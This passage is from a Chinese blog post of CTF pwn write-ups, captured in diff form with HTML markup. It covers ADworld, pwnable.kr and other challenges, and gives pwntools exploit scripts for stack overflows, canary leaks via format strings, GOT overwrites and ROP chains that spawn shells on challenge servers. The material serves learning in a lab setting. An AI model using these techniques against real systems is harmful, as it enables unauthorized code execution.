class="number">10</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">'point(1~6): '</span>)</span><br><span class="line">    p.sendline(str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200607160518598.png" alt="image-20200607160518598"></p>
+<p><strong>总结：1.虽然没有接触新知识，但是学了加载libc.so.6库使用其的函数。</strong></p>
+<h3 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h3><blockquote>
+<p>由于数组没有控制界限，还是栈溢出。这个题由于出题人在题中直接给出了bin/bash，而环境中只有sh，但只要ROP一下，自己通过bin/bash构造sh给system做参数即可。</p>
+</blockquote>
+<p>查保护，除了基地址随机化其他全开。感觉会有点麻烦，难度要绕过canary？ida中看一下。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105006912.png" alt="image-20200609105006912"></p>
+<p>正好看到字符串中有现成的system函数及shell，所以通过上面的数组溢出将函数的返回地址改为system处的地址就得到shell了。</p>
+<p>开始计算数组的地址到函数返回地址处在栈中的偏移，由于ida中静态看到的栈分布可能不准，通过gdb动调看一下。找到第一次给数组赋值的地址及最后ret指令地址下断。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105624424.png" alt="image-20200609105624424"></p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609105703718.png" alt="image-20200609105703718"></p>
+<p>可以看到上面2次的地址分别为<strong>0xffffd01c</strong> <strong>0xffffcf98</strong> 2者之差为<strong>0x84</strong>，即我们要的偏移。</p>
+<p>开始写脚本攻击，但是并没有得到shell。。。找了一会儿错误，没发现。看了其他人的writeup说由于出题人原因，环境中并没有bash，可以通过已有的 /bin/bash得到sh字符串，作为system()参数才行。</p>
+<p>也很容易，直接找到字符串地址，利用数组越界多改变栈中的一个数据为<strong>sh</strong>作为system()的参数即可。exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">58409</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">132</span></span><br><span class="line">system_addr = [<span class="number">0xb4</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line">sh_addr = [<span class="number">0x87</span>, <span class="number">0x89</span>, <span class="number">0x04</span>, <span class="number">0x08</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_</span><span class="params">(offset, val)</span>:</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(str(val))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	write_(offset+i, system_addr[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">	write_(offset+<span class="number">4</span>+i, sh_addr[i])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200609110724445.png" alt="image-20200609110724445"></p>
+<p>最后关于这个题的栈从ida中静态看到栈与实际动调不同的原因，看开头与结尾的汇编代码可以知道答案。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140544469.png" alt="image-20200610140544469"></p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610140847175.png" alt="image-20200610140847175"></p>
+<p><strong>总结：1.从这个题发现数组越界就可以绕过canary，但也是题故意设计的而已。2.静态看到的栈分布于实际运行的可能会不同，这道题就是。</strong></p>
+<h3 id="forot"><a href="#forot" class="headerlink" title="forot"></a>forot</h3><blockquote>
+<p>栈溢出，多了会对输入字符进行判断多构造下。但是当对整个main函数运行完后在ret处控制其走向始终不成功。。。gdb调试栈的偏移反复确定了的，比在ida中静态看到的大4，但这多出来的4就很迷。。。最后觉得是程序在出栈时有一个值还原，有点canary的意思，但是程序没有开canary保护啊。搞了很久还是没弄清原因，后面知识积累多了再来看看怎么回事。。。</p>
+</blockquote>
+<p>只开了NX保护，ida中看下。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171656557.png" alt="image-20200610171656557"></p>
+<p>再看看栈的情况。找到v3与v2数组的地址。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610171941539.png" alt="image-20200610171941539"></p>
+<p>再看到程序中直接有system函数及字符串。</p>
+<p>所以接下来要做的就是改变函数指针并控制v14的值，构造其执行我们的system（）函数。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172311560.png" alt="image-20200610172311560"></p>
+<p>写脚本攻击。这里方法也很多吧，只要构造配合好就可以。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">39422</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x20</span>*<span class="string">'A'</span>+p32(<span class="number">0x080486D2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'Bxnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200610172459341.png" alt="image-20200610172459341"></p>
+<p><strong>总结：1.还是栈溢出，但不是通过改变函数的返回地址，见识更多了吧。2.\x09与\xa是坏字符，当读到这2个字符的时候会截断。</strong></p>
+<h3 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h3><blockquote>
+<p>通过格式化字符串漏洞找到canary后栈溢出控制程序走向。但是。。。。。。。因为开始使用的recvuntil(‘’)没有注意<strong>‘\n’</strong>导致后面直接使用recv()开始只能接收到<strong>’\n’</strong>，花了好多时间卡在这里。。。。。。。。。。算教训了。</p>
+</blockquote>
+<p>除了PIE其他保护全开。运行看一下，让选择是栈溢出还是格式化字符串漏洞。 ida中看看。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611162320998.png" alt="image-20200611162320998"></p>
+<p>虽然是第一次遇到，但也是很容易想到，格式化字符串漏洞是让我们泄露canary用的，知道的canary就可以快乐的栈溢出了。</p>
+<p>那剩下的就都是常规操作了，脚本攻击。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53667</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">canary = int(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(canary) + <span class="number">8</span>*<span class="string">'a'</span> + p64(<span class="number">0x00000000004008DA</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>问题来了。。。无论怎么改<strong>canary = int(p.recv(), 16)</strong>接受屏幕打印出的字符这句话都报错。。。2个多小时耗在这里。。。后面就试了试先<strong>p.recvuntil(‘0x’)</strong>，成功了。。。但自己还是很郁闷。。。又继续找原因，最后才发现<strong>p.recvuntil(‘3. Exit the battle ‘)</strong>中少了 <strong>\n</strong>，导致后面直接recv()接受到的都是回车，还是recvuntil()保障。。。</p>
+<p>加上后再攻击，成功。。。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200611163417332.png" alt="image-20200611163417332"></p>
+<p>总结：1.还是多用recvuntil吧，保障些。2.注意使用recvuntil时中的字符串是否包含到最后。3.RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p>
+<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><blockquote>
+<p>ADworld没有给题目附件，最后看了看别人发的ida伪代码，就只是简单的栈溢出控制程序走向。</p>
+</blockquote>
+<p>题目开头就给了一个地址，后面又是明显的栈溢出，猜也可猜到是将函数返回地址覆盖为给出的地址。</p>
+<p>脚本攻击。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">37196</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200612101533939.png" alt="image-20200612101533939"></p>
+<h2 id="pwnable"><a href="#pwnable" class="headerlink" title="pwnable"></a>pwnable</h2><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><p>题目描述。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151159958.png" alt="image-20200603151159958"></p>
+<p>通过ssh连接后，有3个文件，flag没有权限查看，那就看 fd.c</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603151520348.png" alt="image-20200603151520348"></p>
+<p>由于read函数的第一个参数，0：标准输入；1：标准输出；2：标准错误输出。那这里只要样fd等于0就好了。</p>
+<p>直接让输入第一个参数为 4,660(0x1234)，接着再输入 LETMEWIN 得到flag。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152007549.png" alt="image-20200603152007549"></p>
+<h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote>
+<p>学习了栈溢出后做这个题正合适</p>
+</blockquote>
+<p>得到题目的elf文件后ida打开。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152328450.png" alt="image-20200603152328450"></p>
+<p>再利用ida中很好的栈显示，计算得到需要填充大小 0x34 。</p>
+<p>写py脚本，攻击。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="number">0x34</span>*<span class="string">'a'</span> + p32(<span class="number">0xCAFEBABE</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(message)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200603152657713.png" alt="image-20200603152657713"></p>
+<p><strong>总结：从基础的溢出开始，慢慢进步。</strong></p>
+<h3 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h3><p>题目描述。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090406828.png" alt="image-20200605090406828"></p>
+<p>ssh连接后发现就是让我们输入20个字节的数据，然后转化为5个4字节数据的值相加为0x21DD09EC。</p>
+<p>那就直接凑了，开始直接想的是输入16个0加一个原数据，但字符串计算长度时就会过不了。那凑得方法也很多，只是怎样将不可打印字符输入终端，知道可以使用python的单行执行脚本呢 -c。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605090938145.png" alt="image-20200605090938145"></p>
+<p>另外其实一直想用脚本直接实现，但是不知道怎么用，网上果然有，学习了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span> + p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">p = ssh(host=<span class="string">'pwnable.kr'</span>, port=<span class="number">2222</span>, user=<span class="string">'col'</span>, password=<span class="string">'guest'</span>)</span><br><span class="line">p.connected()</span><br><span class="line"></span><br><span class="line">p1 = p.process(argv=[<span class="string">'col'</span>, s], executable=<span class="string">'./col'</span>)</span><br><span class="line"><span class="keyword">print</span> p1.recv()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092003637.png" alt="image-20200605092003637"></p>
+<p><strong>总结：1.利用python单行脚本输入不打印字符数据。2.利用脚本对ssh连接并交互的方法。3.哈希碰撞的概念。</strong></p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>查看保护的时候发现了upx壳，脱壳后载入ida即可发现flag。</p>
+<p>总结：无。</p>
+<h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote>
+<p>利用scanf()函数中没加取址符&amp;存在的漏洞，覆写got表来达到控制程序走向的目的。</p>
+</blockquote>
+<p>题目描述。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608181103998.png" alt="image-20200608181103998"></p>
+<p>连接后查看passcode.c文件，可以看到scanf()是没有加取地址符的，想通过输入达到目的肯定会报错。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看到welcome（）函数，scanf(“%100s”, name)对输入字符串长度进行了限制，想通过溢出是不行了。</p>
+<p>既然程序出了问题是没加取址符，那突破口肯定就在哪里。又是我第一次遇到的漏洞类型，由于scanf(“%d”, passcode1)中passcode1没加取地址符，将会把passcode1本身的值作为地址然后向其写入数据。并且这个passcode1没有初始化，所以它的默认的值将是上次栈中留下来的值，我们就可以控制上次向栈中写的数据，使scanf（）中的地址是我们向输入数据的地址。</p>
+<blockquote>
+<p>知识点：在welcome（）函数结束后，虽然它会<strong>push esp, ebp；pop ebp；ret</strong>进行一个堆栈平衡，但是只是改变了esp寄存器的值，栈中的内容没有进行清理，如果下次使用同一个栈定义了变量但没有赋初值，那它的初始值将是上次栈中的。</p>
+</blockquote>
+<p>由于got表是可以重写的，它记录着我们要执行函数的地址，那我们就可以将下次要执行的函数地址改成我们想要它执行的函数地址。通过<strong>objdump -R passcode</strong>查看got表。可以看到我们要改写函数在got表中地址为  <strong>0x0804a004</strong></p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608182629397.png" alt="image-20200608182629397"></p>
+<p>找我们想要执行的函数的地址。使用<strong>objdump -d passcode</strong>查看反汇编。找到我们想要执行函数地址：<strong>0x080485e3</strong></p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608183049831.png" alt="image-20200608183049831"></p>
+<p>地址找到后，寻找第一次welcome()函数中输入的字符串的哪一部分会是后面login()函数的第一个变量的值。其实很简单，2个函数是同一个ebp，第一个函数输入的最后4个字节数据将是第二个函数第一个变量的4个字节数据。（解释起来有点抽象，理解了就很简单）</p>
+<p>最后构造字符串，攻击。由于登录到远程终端里没有执行和写脚本的权限，直接使用python与管道命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"print 'a'*96 + '\x04\xa0\x04\x08' + '134514147'"</span> | ./passcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200608184738940.png" alt="image-20200608184738940"></p>
+<p><strong>总结：1.2个命令的学习 objdump -R 文件名（查看got表） 与 objdump -d 文件名（查看反汇编）。2.覆写got的攻击。</strong></p>
+<h2 id="论剑场"><a href="#论剑场" class="headerlink" title="论剑场"></a>论剑场</h2><h3 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h3><blockquote>
+<p>利用栈溢出控制程序的走向</p>
+</blockquote>
+<p>首先使用file与checksec查看一下，64为elf文件，且没有开任何保护，那没有canary，就可以利用栈溢出控制程序走向了。</p>
+<p>ida中看一下，明显存在溢出。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092808030-1591322466624.png" alt="image-20200605092808030"></p>
+<p>继续看一下字符串，找到引用的地方发现了system命令，但不是打开shell之类的字符串。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605093020161.png" alt="image-20200605093020161"></p>
+<p>由于刚接触，很多东西都不知道，看了writeup，长知识了。由于题中有 $0 字符，而这就是 shell本身的名称，可以用它当作传入的system（）函数的参数使用。</p>
+<blockquote>
+<p>一个知识点：<code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/bash -c string</code>来执行参数<code>string</code>字符串所代表的命令，此命令执行完后随即返回原调用的进程。</p>
+</blockquote>
+<blockquote>
+<p>64位程序传参的特点：<strong>使用寄存器传参</strong>，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p>
+</blockquote>
+<p>所以这里要先让程序的走向到 <code>pop edi;ret</code>, 让第一个传参寄存器得到 $0的地址，那后面再通过ret 使system（）的地址弹出给 eip，得到shell。</p>
+<p>开始工作。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095114997.png" alt="image-20200605095114997"></p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095231700.png" alt="image-20200605095231700"></p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095322038.png" alt="image-20200605095322038"></p>
+<p>写利用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">edi = <span class="number">0x00000000004007d3</span></span><br><span class="line">bash = <span class="number">0x000000000060111f</span></span><br><span class="line">sys = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(edi) + p64(bash) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到shell。</p>
+<p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095503617.png" alt="image-20200605095503617"></p>
+<p><strong>总结：1.在没有‘bin\bash’字符串时看看’$0‘。2.64位程序的传参方式，寄存器顺序。3.ROPgadget工具的使用。</strong></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>ooo
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="https://www.bxnop.cn/2020/06/04/pwn%E7%BB%83%E4%B9%A0/" title="pwn练习">https://www.bxnop.cn/2020/06/04/pwn练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+	  <div>
+	  
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+		
+	</div>
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/" rel="prev" title="pwn笔记">
+      <i class="fa fa-chevron-left"></i> pwn笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/06/26/2020%E5%B9%B4DASCTF%E5%85%AD%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="next" title="2020年DASCTF六月线上赛">
+      2020年DASCTF六月线上赛 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
   window.addEventListener('tabs:register', () => {
     let { activeClass } = CONFIG.comments;
     if (CONFIG.comments.storage) {
@@ -18,4 +602,194 @@
       localStorage.setItem('comments_active', commentClass);
     });
   }
-</script></div><div class="toggle sidebar-toggle"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div><aside class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc"> Table of Contents</li><li class="sidebar-nav-overview"> Overview</li></ul><div class="post-toc-wrap sidebar-panel"><div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻防世界"><span class="nav-number">1.</span> <span class="nav-text">攻防世界</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#guess-num"><span class="nav-number">1.1.</span> <span class="nav-text">guess_num</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#cgpwn2"><span class="nav-number">1.2.</span> <span class="nav-text">cgpwn2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-overflow"><span class="nav-number">1.3.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#string"><span class="nav-number">1.4.</span> <span class="nav-text">string</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#level3"><span class="nav-number">1.5.</span> <span class="nav-text">level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dice-game"><span class="nav-number">1.6.</span> <span class="nav-text">dice_game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stack2"><span class="nav-number">1.7.</span> <span class="nav-text">stack2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 